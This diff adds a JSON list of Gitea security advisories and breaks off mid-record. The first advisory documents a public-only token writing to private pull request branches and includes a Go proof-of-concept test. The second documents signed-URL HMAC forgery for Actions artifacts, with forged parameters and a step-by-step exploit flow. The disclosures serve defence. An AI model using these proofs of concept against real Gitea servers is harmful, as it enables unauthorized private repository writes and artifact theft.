@@ -1,0 +1,1054 @@
+[
+  {
+    "ghsa_id": "GHSA-xxjv-752h-3vp2",
+    "cve_id": "CVE-2026-58443",
+    "url": "https://api.github.com/advisories/GHSA-xxjv-752h-3vp2",
+    "html_url": "https://github.com/advisories/GHSA-xxjv-752h-3vp2",
+    "summary": "Gitea: Public-only repository tokens can update private PR head branches",
+    "description": "### Summary\nGitea allows a `public-only,write:repository` token to update a private pull request head branch through a public base repository route.\n\nThe vulnerable endpoint is:\n\n```text\nPOST /api/v1/repos/{public-owner}/{public-repo}/pulls/{index}/update\n```\n\nGitea checks the token's public-only restriction against the route repository, which is the public base repository. `UpdatePullRequest()` then authorizes the pull request head repository with ordinary user RBAC and calls the pull update service. If the head repository is private, the active token's public-only restriction is not re-applied to that private repository before Gitea pushes changes into it.\n\nAs a result, the same token that cannot directly write to the private repository can still cause Gitea to push public base commits into the private head branch.\n\n### Details\nThe pull request API routes are attached under a repository route group. The public-only check applies to `ctx.Repo.Repository`, the route/base repository.\n\n```go\n// routers/api/v1/api.go:1358-1394\n\t\t\t\t\tm.Group(\"/pulls\", func() {\n\t\t\t\t\t\tm.Combo(\"\").Get(repo.ListPullRequests).\n\t\t\t\t\t\t\tPost(reqToken(), mustNotBeArchived, bind(api.CreatePullRequestOption{}), repo.CreatePullRequest)\n\t\t\t\t\t\tm.Get(\"/pinned\", repo.ListPinnedPullRequests)\n\t\t\t\t\t\tm.Post(\"/comments/{id}/resolve\", reqToken(), mustNotBeArchived, repo.ResolvePullReviewComment)\n\t\t\t\t\t\tm.Post(\"/comments/{id}/unresolve\", reqToken(), mustNotBeArchived, repo.UnresolvePullReviewComment)\n\t\t\t\t\t\tm.Group(\"/{index}\", func() {\n\t\t\t\t\t\t\tm.Combo(\"\").Get(repo.GetPullRequest).\n\t\t\t\t\t\t\t\tPatch(reqToken(), bind(api.EditPullRequestOption{}), repo.EditPullRequest)\n\t\t\t\t\t\t\tm.Get(\".{diffType:diff|patch}\", repo.DownloadPullDiffOrPatch)\n\t\t\t\t\t\t\tm.Post(\"/update\", reqToken(), repo.UpdatePullRequest)\n\t\t\t\t\t\t\tm.Get(\"/commits\", repo.GetPullRequestCommits)\n\t\t\t\t\t\t\tm.Get(\"/files\", repo.GetPullRequestFiles)\n\t\t\t\t\t\t\tm.Combo(\"/merge\").Get(repo.IsPullRequestMerged).\n\t\t\t\t\t\t\t\tPost(reqToken(), mustNotBeArchived, bind(forms.MergePullRequestForm{}), repo.MergePullRequest).\n\t\t\t\t\t\t\t\tDelete(reqToken(), mustNotBeArchived, repo.CancelScheduledAutoMerge)\n\t\t\t\t\t\t\tm.Group(\"/reviews\", func() {\n\t\t\t\t\t\t\t\tm.Combo(\"\").\n\t\t\t\t\t\t\t\t\tGet(repo.ListPullReviews).\n\t\t\t\t\t\t\t\t\tPost(reqToken(), bind(api.CreatePullReviewOptions{}), repo.CreatePullReview)\n\t\t\t\t\t\t\t\tm.Group(\"/{id}\", func() {\n\t\t\t\t\t\t\t\t\tm.Combo(\"\").\n\t\t\t\t\t\t\t\t\t\tGet(repo.GetPullReview).\n\t\t\t\t\t\t\t\t\t\tDelete(reqToken(), repo.DeletePullReview).\n\t\t\t\t\t\t\t\t\t\tPost(reqToken(), bind(api.SubmitPullReviewOptions{}), repo.SubmitPullReview)\n\t\t\t\t\t\t\t\t\tm.Combo(\"/comments\").\n\t\t\t\t\t\t\t\t\t\tGet(repo.GetPullReviewComments)\n\t\t\t\t\t\t\t\t\tm.Post(\"/dismissals\", reqToken(), bind(api.DismissPullReviewOptions{}), repo.DismissPullReview)\n\t\t\t\t\t\t\t\t\tm.Post(\"/undismissals\", repo.UnDismissPullReview)\n\t\t\t\t\t\t\t\t})\n\t\t\t\t\t\t\t})\n\t\t\t\t\t\t\tm.Combo(\"/requested_reviewers\", reqToken()).\n\t\t\t\t\t\t\t\tDelete(bind(api.PullReviewRequestOptions{}), repo.DeleteReviewRequests).\n\t\t\t\t\t\t\t\tPost(bind(api.PullReviewRequestOptions{}), repo.CreateReviewRequests)\n\t\t\t\t\t\t})\n\t\t\t\t\t\tm.Get(\"/{base}/*\", repo.GetPullRequestByBaseHead)\n\t\t\t\t\t}, mustAllowPulls, reqRepoReader(unit.TypeCode), context.ReferencesGitRepo())\n```\n\n```go\n// routers/api/v1/api.go:1465-1466\n\t\t\t\t}, repoAssignment(), checkTokenPublicOnly())\n\t\t\t}, tokenRequiresScopes(auth_model.AccessTokenScopeCategoryRepository))\n```\n\nFor `POST /api/v1/repos/{public-owner}/{public-repo}/pulls/{index}/update`, the route repository can be public, so a `public-only,write:repository` token passes the route-level public-only check.\n\nThe update handler then checks whether the caller can update the PR head branch:\n\n```go\n// routers/api/v1/repo/pull.go:1220-1270\n\tpr, err := issues_model.GetPullRequestByIndex(ctx, ctx.Repo.Repository.ID, ctx.PathParamInt64(\"index\"))\n\tif err != nil {\n\t\tif issues_model.IsErrPullRequestNotExist(err) {\n\t\t\tctx.APIErrorNotFound()\n\t\t} else {\n\t\t\tctx.APIErrorInternal(err)\n\t\t}\n\t\treturn\n\t}\n\n\tif pr.HasMerged {\n\t\tctx.APIError(http.StatusUnprocessableEntity, err)\n\t\treturn\n\t}\n\n\tif err = pr.LoadIssue(ctx); err != nil {\n\t\tctx.APIErrorInternal(err)\n\t\treturn\n\t}\n\n\tif pr.Issue.IsClosed {\n\t\tctx.APIError(http.StatusUnprocessableEntity, err)\n\t\treturn\n\t}\n\n\tif err = pr.LoadBaseRepo(ctx); err != nil {\n\t\tctx.APIErrorInternal(err)\n\t\treturn\n\t}\n\tif err = pr.LoadHeadRepo(ctx); err != nil {\n\t\tctx.APIErrorInternal(err)\n\t\treturn\n\t}\n\n\trebase := ctx.FormString(\"style\") == \"rebase\"\n\nallowedUpdateByMerge, allowedUpdateByRebase, err := pull_service.IsUserAllowedToUpdate(ctx, pr, ctx.Doer)\n\tif err != nil {\n\t\tctx.APIErrorInternal(err)\n\t\treturn\n\t}\n\n\tif (!allowedUpdateByMerge && !rebase) || (rebase && !allowedUpdateByRebase) {\n\t\tctx.Status(http.StatusForbidden)\n\t\treturn\n\t}\n\n\t// default merge commit message\n\tmessage := fmt.Sprintf(\"Merge branch '%s' into %s\", pr.BaseBranch, pr.HeadBranch)\n```\n\nThe service checks the head repository using the user's normal repository permission:\n\n```go\n// services/pull/update.go:136-164\n// IsUserAllowedToUpdate check if user is allowed to update PR with given permissions and branch protections\n// update PR means send new commits to PR head branch from base branch\nfunc IsUserAllowedToUpdate(ctx context.Context, pull *issues_model.PullRequest, user *user_model.User) (pushAllowed, rebaseAllowed bool, err error) {\n\tif user == nil {\n\t\treturn false, false, nil\n\t}\n\tif err := pull.LoadBaseRepo(ctx); err != nil {\n\t\treturn false, false, err\n\t}\n\tif err := pull.LoadHeadRepo(ctx); err != nil {\n\t\treturn false, false, err\n\t}\n\n\t// 1. check whether pull request enabled.\n\tprBaseUnit, err := pull.BaseRepo.GetUnit(ctx, unit.TypePullRequests)\n\tif repo_model.IsErrUnitTypeNotExist(err) {\n\t\treturn false, false, nil // the PR unit is disabled in base repo means no update allowed\n\t} else if err != nil {\n\t\treturn false, false, fmt.Errorf(\"get base repo unit: %v\", err)\n\t}\n\n\t// 2. only support Github style pull request\n\tif pull.Flow == issues_model.PullRequestFlowAGit {\n\t\treturn false, false, nil\n\t}\n\n\t// 3. check user push permission on head repository\npushAllowed, rebaseAllowed, err = isUserAllowedToPushOrForcePushInRepoBranch(ctx, user, pull.HeadRepo, pull.HeadBranch)\n\tif err != nil {\n\t\treturn false, false, err\n\t}\n```\n\nThat is an ordinary account RBAC decision. It does not ask whether the active API token is allowed to access or mutate `pull.HeadRepo`.\n\nIf allowed, the update service performs a merge/rebase update and pushes into the head repository:\n\n```go\n// services/pull/update.go:89-100\n\treversePR := &issues_model.PullRequest{\n\t\tBaseRepoID: pr.HeadRepoID,\n\t\tBaseRepo:   pr.HeadRepo,\n\t\tBaseBranch: pr.HeadBranch,\n\n\t\tHeadRepoID: pr.BaseRepoID,\n\t\tHeadRepo:   pr.BaseRepo,\n\t\tHeadBranch: pr.BaseBranch,\n\t}\n\n_, err = doMergeAndPush(ctx, reversePR, doer, repo_model.MergeStyleMerge, \"\", message, repository.PushTriggerPRUpdateWithBase)\n\treturn err\n```\n\nThe result is a server-side private repository write performed through a public route.\n\n### PoC\n```go\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"testing\"\n\t\"time\"\n\n\tactions_model \"code.gitea.io/gitea/models/actions\"\n\tauth_model \"code.gitea.io/gitea/models/auth\"\n\trepo_model \"code.gitea.io/gitea/models/repo\"\n\tunit_model \"code.gitea.io/gitea/models/unit\"\n\t\"code.gitea.io/gitea/models/unittest\"\n\tuser_model \"code.gitea.io/gitea/models/user\"\n\t\"code.gitea.io/gitea/modules/gitrepo\"\n\tapi \"code.gitea.io/gitea/modules/structs\"\n\twebhook_module \"code.gitea.io/gitea/modules/webhook\"\n\trepo_service \"code.gitea.io/gitea/services/repository\"\n\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nfunc TestPOCPublicOnlyRepositoryTokenUpdatesPrivatePRHeadBranch(t *testing.T) {\n\tonGiteaRun(t, func(t *testing.T, _ *url.URL) {\n\t\tdoer := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: \"user1\"})\n\n\t\tbaseRepo, err := repo_service.CreateRepository(t.Context(), doer, doer, repo_service.CreateRepoOptions{\n\t\t\tName:          \"public-pr-update-base\",\n\t\t\tDescription:   \"public base repository for public-only PR update PoC\",\n\t\t\tAutoInit:      true,\n\t\t\tReadme:        \"Default\",\n\t\t\tDefaultBranch: \"main\",\n\t\t\tIsPrivate:     false,\n\t\t})\n\t\trequire.NoError(t, err)\n\n\t\theadRepo, err := repo_service.ForkRepository(t.Context(), doer, doer, repo_service.ForkRepoOptions{\n\t\t\tBaseRepo:     baseRepo,\n\t\t\tName:         \"private-pr-update-head\",\n\t\t\tDescription:  \"private head repository for public-only PR update PoC\",\n\t\t\tSingleBranch: baseRepo.DefaultBranch,\n\t\t})\n\t\trequire.NoError(t, err)\n\t\trequire.NotNil(t, headRepo)\n\t\trequire.NoError(t, repo_service.UpdateRepositoryUnits(t.Context(), headRepo, []repo_model.RepoUnit{{\n\t\t\tRepoID: headRepo.ID,\n\t\t\tType:   unit_model.TypeActions,\n\t\t}}, nil))\n\t\theadRepo = unittest.AssertExistsAndLoadBean(t, &repo_model.Repository{ID: headRepo.ID})\n\n\t\theadBranch := \"private-head-update\"\n\t\ttestCreateFileInBranch(t, doer, headRepo, createFileInBranchOptions{\n\t\t\tOldBranch: baseRepo.DefaultBranch,\n\t\t\tNewBranch: headBranch,\n\t\t}, map[string]string{\n\t\t\t\"private-head-marker.txt\": \"private head branch marker\",\n\t\t})\n\t\tconst workflowID = \"private-push.yml\"\n\t\tconst workflowSentinel = \"FAULTLINE_POC_062_PRIVATE_ACTION\"\n\t\ttestCreateFileInBranch(t, doer, headRepo, createFileInBranchOptions{\n\t\t\tOldBranch: headBranch,\n\t\t\tNewBranch: headBranch,\n\t\t}, map[string]string{\n\t\t\t\".gitea/workflows/\" + workflowID: fmt.Sprintf(`name: private-push\non:\n  push:\n    branches:\n      - %s\njobs:\n  private-head-job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo %s\n`, headBranch, workflowSentinel),\n\t\t})\n\n\t\trequire.NoError(t, repo_model.UpdateRepositoryColsNoAutoTime(t.Context(), &repo_model.Repository{\n\t\t\tID:        headRepo.ID,\n\t\t\tIsPrivate: true,\n\t\t}, \"is_private\"))\n\t\theadRepo = unittest.AssertExistsAndLoadBean(t, &repo_model.Repository{ID: headRepo.ID})\n\t\trequire.True(t, headRepo.IsPrivate)\n\t\tbaselinePrivateHeadRuns := unittest.GetCount(t, &actions_model.ActionRun{RepoID: headRepo.ID})\n\n\t\tsession := loginUser(t, doer.Name)\n\t\tpublicOnlyToken := getTokenForLoggedInUser(t, session,\n\t\t\tauth_model.AccessTokenScopePublicOnly,\n\t\t\tauth_model.AccessTokenScopeWriteRepository,\n\t\t)\n\n\t\tpublicPath := \"public-base-injected-into-private.txt\"\n\t\tpublicMarker := \"FAULT-GITEA-062 public base content reached private head\"\n\t\tcreatePublicBaseFile := api.CreateFileOptions{\n\t\t\tFileOptions: api.FileOptions{\n\t\t\t\tBranchName: baseRepo.DefaultBranch,\n\t\t\t\tMessage:    \"create public marker for private head update\",\n\t\t\t},\n\t\t\tContentBase64: base64.StdEncoding.EncodeToString([]byte(publicMarker)),\n\t\t}\n\t\treq := NewRequestWithJSON(t, \"POST\", fmt.Sprintf(\"/api/v1/repos/%s/contents/%s\", baseRepo.FullName(), publicPath), &createPublicBaseFile).\n\t\t\tAddTokenAuth(publicOnlyToken)\n\t\tMakeRequest(t, req, http.StatusCreated)\n\n\t\tprivatePath := \"direct-private-write-should-fail.txt\"\n\t\tdirectPrivateWrite := api.CreateFileOptions{\n\t\t\tFileOptions: api.FileOptions{\n\t\t\t\tBranchName: headBranch,\n\t\t\t\tMessage:    \"direct private write attempt\",\n\t\t\t},\n\t\t\tContentBase64: base64.StdEncoding.EncodeToString([]byte(\"direct private write marker\")),\n\t\t}\n\t\treq = NewRequestWithJSON(t, \"POST\", fmt.Sprintf(\"/api/v1/repos/%s/contents/%s\", headRepo.FullName(), privatePath), &directPrivateWrite).\n\t\t\tAddTokenAuth(publicOnlyToken)\n\t\tMakeRequest(t, req, http.StatusNotFound)\n\n\t\tprPayload := map[string]string{\n\t\t\t\"title\": \"faultline public-only private head update\",\n\t\t\t\"base\":  baseRepo.DefaultBranch,\n\t\t\t\"head\":  fmt.Sprintf(\"%s/%s:%s\", doer.Name, headRepo.Name, headBranch),\n\t\t}\n\t\treq = NewRequestWithJSON(t, \"POST\", fmt.Sprintf(\"/api/v1/repos/%s/pulls\", baseRepo.FullName()), prPayload).\n\t\t\tAddTokenAuth(publicOnlyToken)\n\t\tresp := MakeRequest(t, req, http.StatusCreated)\n\n\t\tvar pr api.PullRequest\n\t\tDecodeJSON(t, resp, &pr)\n\t\trequire.Equal(t, prPayload[\"title\"], pr.Title)\n\n\t\tgitRepo, err := gitrepo.OpenRepository(t.Context(), headRepo)\n\t\trequire.NoError(t, err)\n\t\tdefer gitRepo.Close()\n\n\t\tcommit, err := gitRepo.GetBranchCommit(headBranch)\n\t\trequire.NoError(t, err)\n\t\t_, err = commit.GetBlobByPath(publicPath)\n\t\trequire.Error(t, err)\n\n\t\treq = NewRequestf(t, \"POST\", \"/api/v1/repos/%s/pulls/%d/update?style=merge\", baseRepo.FullName(), pr.Index).\n\t\t\tAddTokenAuth(publicOnlyToken)\n\t\tMakeRequest(t, req, http.StatusOK)\n\t\tassert.Eventually(t, func() bool {\n\t\t\treturn unittest.GetCount(t, &actions_model.ActionRun{RepoID: headRepo.ID}) > baselinePrivateHeadRuns\n\t\t}, 5*time.Second, 50*time.Millisecond)\n\n\t\tactionRun := unittest.AssertExistsAndLoadBean(t, &actions_model.ActionRun{\n\t\t\tRepoID:     headRepo.ID,\n\t\t\tWorkflowID: workflowID,\n\t\t}, unittest.OrderBy(\"id DESC\"))\n\t\tassert.Equal(t, webhook_module.HookEventPush, actionRun.Event)\n\t\tassert.Equal(t, \"push\", actionRun.TriggerEvent)\n\t\tassert.Equal(t, doer.ID, actionRun.TriggerUserID)\n\t\tassert.NotEmpty(t, actionRun.CommitSHA)\n\n\t\tjob := unittest.AssertExistsAndLoadBean(t, &actions_model.ActionRunJob{RunID: actionRun.ID})\n\t\tassert.Contains(t, string(job.WorkflowPayload), workflowSentinel)\n\n\t\tcommit, err = gitRepo.GetBranchCommit(headBranch)\n\t\trequire.NoError(t, err)\n\t\tblob, err := commit.GetBlobByPath(publicPath)\n\t\trequire.NoError(t, err)\n\t\tcontent, err := blob.GetBlobContent(1024)\n\t\trequire.NoError(t, err)\n\t\tassert.Equal(t, publicMarker, content)\n\t})\n}\n```\n\n### Impact\nThe attacker needs a valid `public-only,write:repository` token for a user who has normal write permission to the private PR head branch. The attacker also needs a public base repository and a pull request relationship where the public base can be merged or rebased into the private head.\n\nSuccessful exploitation gives a private repository write primitive through a token that is explicitly limited to public repositories. The direct impact is integrity: public base commits are pushed into a private branch even though direct private repository writes are rejected for the same token.\n\nWhen Actions is enabled on the private head repository, the same server-side push also queues the private repository's matching `push` workflow. The PoC confirms an `ActionRun` and `ActionRunJob` are created for the private head repository with the attack-triggered push event.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-xxjv-752h-3vp2",
+    "source_code_location": "https://github.com/go-gitea/gitea",
+    "identifiers": [
+      {
+        "value": "GHSA-xxjv-752h-3vp2",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-58443",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-xxjv-752h-3vp2",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.27.0",
+      "https://github.com/advisories/GHSA-xxjv-752h-3vp2"
+    ],
+    "published_at": "2026-07-21T20:38:06Z",
+    "updated_at": "2026-07-21T20:38:07Z",
+    "github_reviewed_at": "2026-07-21T20:38:06Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": "< 1.27.0",
+        "first_patched_version": "1.27.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "ohxorud-dev",
+          "id": 69416816,
+          "node_id": "MDQ6VXNlcjY5NDE2ODE2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/69416816?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ohxorud-dev",
+          "html_url": "https://github.com/ohxorud-dev",
+          "followers_url": "https://api.github.com/users/ohxorud-dev/followers",
+          "following_url": "https://api.github.com/users/ohxorud-dev/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ohxorud-dev/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ohxorud-dev/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ohxorud-dev/subscriptions",
+          "organizations_url": "https://api.github.com/users/ohxorud-dev/orgs",
+          "repos_url": "https://api.github.com/users/ohxorud-dev/repos",
+          "events_url": "https://api.github.com/users/ohxorud-dev/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ohxorud-dev/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "bircni",
+          "id": 75789103,
+          "node_id": "MDQ6VXNlcjc1Nzg5MTAz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/bircni",
+          "html_url": "https://github.com/bircni",
+          "followers_url": "https://api.github.com/users/bircni/followers",
+          "following_url": "https://api.github.com/users/bircni/following{/other_user}",
+          "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/bircni/subscriptions",
+          "organizations_url": "https://api.github.com/users/bircni/orgs",
+          "repos_url": "https://api.github.com/users/bircni/repos",
+          "events_url": "https://api.github.com/users/bircni/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/bircni/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H",
+      "score": 9.6
+    }
+  },
+  {
+    "ghsa_id": "GHSA-hg5r-vq93-9fv6",
+    "cve_id": "CVE-2026-58426",
+    "url": "https://api.github.com/advisories/GHSA-hg5r-vq93-9fv6",
+    "html_url": "https://github.com/advisories/GHSA-hg5r-vq93-9fv6",
+    "summary": "Gitea Actions Artifacts V4 signed URL HMAC ambiguity allows cross-repository artifact read and cross-task upload-state write",
+    "description": "### Summary\n\nGitea Actions Artifacts V4 signed upload/download URLs can be rewritten to access a different running task and repository context while preserving the original HMAC signature. An attacker with permission to run a Gitea Actions job can turn a signed URL for an attacker-controlled artifact into a URL that reads artifacts from another task context, or writes attacker-controlled data into another task's artifact upload staging context, including in a private repository.\n\nThis is one vulnerability with two exploit paths:\n\n- `DownloadArtifact`: cross-task/cross-repository artifact read, giving `C:H`.\n- `UploadArtifact`: cross-task artifact staging write and metadata mutation, giving `I:H`.\n\n### Details\n\nThe root cause is that the V4 artifact signed URL signature is built from raw concatenated fields without delimiters or length-prefixing:\n\n```go\nfunc (r *artifactV4Routes) buildSignature(endpoint, expires, artifactName string, taskID, artifactID int64) []byte {\n        mac := hmac.New(sha256.New, setting.GetGeneralTokenSigningSecret())\n        mac.Write([]byte(endpoint))\n        mac.Write([]byte(expires))\n        mac.Write([]byte(artifactName))\n        _, _ = fmt.Fprint(mac, taskID)\n        _, _ = fmt.Fprint(mac, artifactID)\n        return mac.Sum(nil)\n}\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:164-171`.\n\nBecause `artifactName`, `taskID`, and `artifactID` are concatenated without boundaries, two different URL tuples can produce the same HMAC input. For example:\n\n```text\nsigned tuple:\nartifactName = \"artifact-795-153\"\ntaskID       = 48\nartifactID   = <attacker artifact id>\n\nforged tuple:\nartifactName = \"artifact-795-1\"\ntaskID       = 53\nartifactID   = 48<attacker artifact id>\n```\n\nThe final HMAC input suffix is identical:\n\n```text\nartifact-795-15348<attacker artifact id>\n```\n\nThe attacker does not need to know the target artifact's database `artifactID`. The forged URL's `artifactID` only needs to carry digits that preserve the original HMAC input. After verification, the actual target artifact is looked up by target task/run/attempt and `artifactName`, not by the signed `artifactID`.\n\nThe signed URL handlers are unauthenticated and use `ArtifactV4Contexter()` only:\n\n```go\nm.Group(\"\", func() {\n        m.Put(\"UploadArtifact\", r.uploadArtifact)\n        m.Get(\"DownloadArtifact\", r.downloadArtifact)\n}, ArtifactV4Contexter())\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:156-159`.\n\nAfter verifying the HMAC, `verifySignature()` trusts the URL-controlled `taskID`, loads that task, checks that it is running, and returns the URL-controlled `artifactName`. It parses `artifactID` for the HMAC, but does not load or bind the artifact by that signed artifact ID:\n\n```go\ntask, err := actions_model.GetTaskByID(ctx, taskID)\n...\nif task.Status != actions_model.StatusRunning {\n        ...\n}\n...\nreturn task, artifactName, true\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:224-267`.\n\nThe artifact lookup then uses the URL-selected task's run/attempt plus URL-selected artifact name:\n\n```go\nhas, err := db.GetEngine(ctx).Where(builder.Eq{\n        \"run_id\": runID,\n        \"run_attempt_id\": runAttemptID,\n        \"artifact_name\": name,\n}, builder.Like{\"content_encoding\", \"%/%\"}).Get(&art)\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:270-278`.\n\nFor download, the forged URL reaches `downloadArtifact()`, which verifies the signature, resolves the artifact by the forged task/run/name context, and serves it:\n\n```go\ntask, artifactName, ok := r.verifySignature(ctx, \"DownloadArtifact\")\n...\nartifact, err := r.getArtifactByName(ctx, task.Job.RunID, task.Job.RunAttemptID, artifactName)\n...\nerr = actions.DownloadArtifactV4ReadStorage(ctx.Base, artifact)\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:674-693`.\n\nFor upload, the forged URL reaches `uploadArtifact()`, which verifies the signature, resolves the target artifact by the forged task/run/name context, appends attacker-controlled data, and updates target artifact metadata:\n\n```go\ntask, artifactName, ok := r.verifySignature(ctx, \"UploadArtifact\")\n...\nartifact, err := r.getArtifactByName(ctx, task.Job.RunID, task.Job.RunAttemptID, artifactName)\n...\nuploadedLength, err := appendUploadChunkV3(r.fs, ctx, artifact, artifact.RunID, artifact.FileSize)\n...\nartifact.FileCompressedSize += uploadedLength\nartifact.FileSize += uploadedLength\n...\nactions_model.UpdateArtifactByID(ctx, artifact.ID, artifact)\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:382-422`.\n\nThe strengthened dynamic PoC also opens the storage object created by the forged upload and verifies that the attacker-controlled bytes were written under the target run and target artifact ID staging path. This demonstrates an unauthorized write primitive into the target artifact upload context. The current PoC does not claim that a finalized artifact download already serves modified bytes; for the integrity path, the confirmed impact is cross-context staging write plus target artifact metadata mutation. In normal artifact upload flow, data in this staging area is what `FinalizeArtifact` later consumes.\n\nV4 artifact creation also appears to omit the existing artifact-name validation:\n\n```go\nartifactName := req.Name\n...\nartifact, err := actions_model.CreateArtifact(ctx, ctx.ActionTask, artifactName, fileName, retentionDays)\n```\n\nAffected code: `routers/api/actions/artifactsv4.go:309-337`.\n\nThis is a hardening issue, but it is not required for the demonstrated tuple-boundary collision. The crafted artifact names in the PoC use ordinary characters such as letters, digits, and hyphens that would normally be valid. The root cause is the ambiguous signed payload plus the post-verification lookup by URL-selected task/run/name context.\n\nThe target task must be running, but that is the normal validity window of these signed URLs. The exploit itself is a deterministic parameter rewrite against the active artifact URL flow, so `AC:L` is appropriate.\n\nEven if the integrity impact is scored conservatively, the `DownloadArtifact` path independently demonstrates cross-repository private artifact disclosure.\n\nPractical constraints:\n\n- the target task must be in `running` state;\n- the target task ID and artifact name must be known or predictable;\n- for `DownloadArtifact` on newer branches, the target artifact must already be `UploadConfirmed` while the target task is still running. Older V4 implementations differ slightly in artifact lookup/status handling; the PoC validates the branch-specific condition used by each tested release;\n- the forged decimal `artifactID` must parse as `int64`;\n- the exact storage effect depends on the configured artifact storage backend. The local PoC uses the default non-Azure storage path. The root cause still exists before storage backend handling because the signed URL context is confused before upload/download dispatch.\n- the demonstrated exploit applies when Gitea issues its own V4 `UploadArtifact`/`DownloadArtifact` signed URLs. Storage backends or configurations that return direct backend URLs should be assessed separately, because they may bypass these Gitea signed URL handlers.\n\n### PoC\n\nTested against Gitea `main` checkout:\n\n```text\n6a270662690439cabe8582e92c22b04d1f8a3fe9\n```\n\nVerified affected versions tested locally:\n\n```text\nmain       6a27066269  reproduced dynamically\nv1.26.1    afdbd9b7c5  reproduced dynamically\nv1.25.5    f913d90ab6  reproduced dynamically\nv1.24.7    99053ce4fa  reproduced dynamically\nv1.23.8    cccd54999a  reproduced dynamically\nv1.22.6    8eefa1f6de  reproduced dynamically with Go 1.22.12 test toolchain\nv1.21.11   V4 artifactsv4.go route not present in routers/api/actions; not affected by this V4 signed URL path as tested\n```\n\nUnless otherwise noted, the affected code snippets and line numbers above refer to the tested `main` checkout `6a27066269`. Older release branches contain the same vulnerable signed URL construction and post-verification context confusion, but line numbers and artifact lookup details differ slightly between releases. For example, newer code includes `run_attempt_id` in the artifact lookup, while older V4 implementations look up by run/name/path/content-encoding. These differences do not affect the demonstrated HMAC boundary-collision primitive.\n\nFor `main`, `v1.26.1`, and `v1.25.5`, the PoC uses the private `user2/repo2` fixture and demonstrates cross-repository artifact read. For `v1.24.7`, `v1.23.8`, and `v1.22.6`, the compatible test fixtures differ, so the portable PoC demonstrates the same signed URL rewrite across task/run contexts; `v1.22.6` creates the target artifact inside the test because that release does not include the newer artifact fixture file.\n\nThe private-repository disclosure impact is demonstrated on releases with suitable private repository fixtures; on older fixtures, the portable test confirms the same cross-context signed URL rewrite primitive, which applies to private targets under the same running-task and known-identifier conditions. The PoC was adapted per release only to account for fixture and test-toolchain differences; the exploit primitive is the same signed URL tuple rewrite.\n\nLocal test environment:\n\n- Gitea integration test environment.\n- Default local Actions artifact storage, not Azure direct upload.\n- Existing fixture tasks/artifacts from Gitea's test fixtures.\n- The dynamic PoC sets the target task status to `running` before exploiting the URL, matching the vulnerable signed URL requirement.\n\nRun:\n\n```bash\ncd /home/kali/gitea/pocs\nGITEA_REPO=/home/kali/gitea/repo GOTOOLCHAIN=auto go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\n```\n\nThe dynamic PoC writes a temporary integration test into the Gitea checkout, runs only that test, and removes the temporary test afterward.\n\nThe test uses:\n\n```text\nattacker task: 48\nattacker run: 792\nattacker job: 193\nattacker repository id: 4\n\ntarget task: 53\ntarget run: 795\ntarget job: 198\ntarget repository: user2/repo2, repository id 2\ntarget artifact: artifact-795-1\ncrafted attacker artifact: artifact-795-153\n```\n\nPoC flow:\n\n1. Create an Actions authorization token for attacker task `48`.\n2. Verify the attacker token cannot request a signed URL for target run `795` through the authenticated Twirp API.\n3. Create an attacker-controlled V4 artifact named `artifact-795-153`.\n4. Upload and finalize that attacker artifact to obtain a legitimate signed URL.\n5. Rewrite the signed download URL:\n\n```text\nartifactName=artifact-795-1\ntaskID=53\nartifactID=48<attackerArtifactID>\n```\n\n6. Send the forged final `GET` without any token and receive the private target artifact from `user2/repo2`.\n7. Rewrite the signed upload URL in the same way.\n8. Send a forged `PUT ...&comp=appendBlock` with attacker-controlled data.\n9. Confirm the target artifact metadata was changed by the forged upload.\n10. Open the target run/artifact staging chunk from storage and confirm it contains the attacker-controlled bytes.\n\nObserved output:\n\n```text\nsource=/home/kali/gitea/repo\nok      code.gitea.io/gitea/tests/integration   9.069s\nreproduced: attacker task cannot request a target-run signed URL through the authenticated Twirp 